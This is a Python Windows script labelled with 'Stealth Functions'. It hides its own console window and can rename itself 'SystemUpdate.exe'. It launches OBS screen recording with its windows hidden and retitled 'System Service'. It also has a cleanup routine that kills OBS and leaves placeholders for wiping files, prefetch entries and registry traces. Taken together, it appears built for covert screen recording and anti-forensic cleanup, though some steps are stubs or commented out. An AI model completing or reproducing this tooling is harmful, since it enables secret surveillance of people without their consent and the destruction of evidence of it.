import os
import sys
import ctypes
import shutil
import glob
import time
import threading
import psutil
import win32gui
import win32con
import win32process
import subprocess
import tkinter as tk
from tkinter import filedialog, messagebox

# ================================
# Stealth Functions
# ================================

def run_invisible():
    # Hide your app window at startup
    whnd = ctypes.windll.kernel32.GetConsoleWindow()
    if whnd:
        ctypes.windll.user32.ShowWindow(whnd, 0)  # 0 = SW_HIDE

def rename_self(new_name="SystemUpdate.exe"):
    # Rename current executable for stealth
    try:
        current_path = sys.executable
        dir_path = os.path.dirname(current_path)
        new_path = os.path.join(dir_path, new_name)
        if not os.path.exists(new_path):
            os.rename(current_path, new_path)
            # Restart the app with new name
            os.startfile(new_path)
            sys.exit()
    except Exception as e:
        print("Rename failed:", e)

def hide_obs_windows():
    # Hide all windows with 'OBS' in title or class name
    def callback(hwnd, _):
        title = win32gui.GetWindowText(hwnd)
        class_name = win32gui.GetClassName(hwnd)
        if "OBS" in title or "OBS" in class_name:
            win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
    win32gui.EnumWindows(callback, None)

def set_obs_window_titles():
    # Change OBS window titles to generic
    def callback(hwnd, _):
        title = win32gui.GetWindowText(hwnd)
        class_name = win32gui.GetClassName(hwnd)
        if "OBS" in title or "OBS" in class_name:
            win32gui.SetWindowText(hwnd, "System Service")
    win32gui.EnumWindows(callback, None)

def launch_obs(obs_path):
    # Launch OBS and hide its windows
    subprocess.Popen([obs_path], shell=False)
    time.sleep(2)  # wait for window to appear
    hide_obs_windows()
    set_obs_window_titles()

# ================================
# Your core cleanup functions (replace placeholders)
# ================================

def kill_and_wipe():
    # Example placeholder: implement your full cleanup here
    global obs_path
    if not obs_path:
        messagebox.showwarning("Warning", "Set OBS path first.")
        return

    # Kill OBS processes
    for proc in list(psutil.process_iter(["name", "pid"])):
        try:
            if (proc.info["name"] or "").lower() == "obs64.exe":
                for hwnd in _windows_for_pid(proc.info["pid"]):
                    try:
                        win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
                    except:
                        pass
                time.sleep(1)
                try:
                    proc.terminate()
                except:
                    pass
                try:
                    proc.kill()
                except:
                    pass
        except:
            pass

    # Collect targets, prefetch, registry traces etc.
    # (Replace with your actual cleanup code)
    # ...
    print("Cleanup executed (replace with your actual code).")

def _windows_for_pid(pid):
    hwnds = []
    def callback(hwnd, _):
        if win32gui.GetParent(hwnd):
            return True
        try:
            _, pid_found = win32process.GetWindowThreadProcessId(hwnd)
            if pid_found == pid:
                hwnds.append(hwnd)
        except:
            pass
        return True
    win32gui.EnumWindows(callback, None)
    return hwnds

# Placeholder for targets and registry cleanup
def _collect_wipe_targets():
    return []

def _collect_prefetch_globs():
    return []

def _wipe_registry():
    pass

# ================================
# Main execution
# ================================

if __name__ == "__main__":
    # 1. Auto-rename for stealth (UNCOMMENT below to enable)
    # rename_self("SystemUpdate.exe")  # Will restart with new name

    # 2. Run invisibly
    run_invisible()

    # 3. Set your OBS path here or load from config
    obs_path = r"C:\Path\To\obs64.exe"  # <-- set your default OBS path

    # 4. Launch OBS stealthily
    if os.path.exists(obs_path):
        launch_obs(obs_path)
    else:
        print("OBS path invalid or not set.")
        # Optionally, prompt user to browse for OBS
        # (Your GUI code here)

    # 5. Proceed with cleanup or other operations
    # kill_and_wipe()  # Uncomment or call from your GUI